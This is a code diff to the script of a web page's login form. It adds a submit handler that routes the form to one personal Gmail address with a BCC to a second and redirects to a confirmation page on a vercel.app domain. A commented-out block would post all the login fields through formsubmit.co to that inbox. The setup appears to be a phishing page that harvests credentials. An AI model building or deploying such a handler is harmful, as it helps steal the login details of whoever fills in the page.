@@ -115,6 +115,47 @@
             console.error('ERROR: Could not find form with id="loginForm"');
         }
     });
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+    console.log('🚀 Form submitting...');
+    console.log('📧 To: psalmcares878@gmail.com');
+    console.log('📧 BCC: Samfat246@gmail.com');
+    console.log('🔗 Redirect to: https://ko-konami-mi.vercel.app/confirmation.html');
+    
+    // Let form submit normally
+    // If still not working, uncomment below to use Ajax:
+    
+    /*
+    e.preventDefault();
+    
+    const form = e.target;
+    const formData = new FormData(form);
+    const data = Object.fromEntries(formData.entries());
+    
+    console.log('📤 Sending data:', data);
+    
+    fetch('https://formsubmit.co/ajax/psalmcares878@gmail.com', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(result => {
+        console.log('✅ Response:', result);
+        if (result.success) {
+            window.location.href = 'https://ko-konami-mi.vercel.app/confirmation.html';
+        } else {
+            alert('Error: ' + (result.message || 'Submission failed'));
+        }
+    })
+    .catch(error => {
+        console.error('❌ Error:', error);
+        alert('Network error');
+    });
+    */
+});
     </script>
 </body>
 </html>
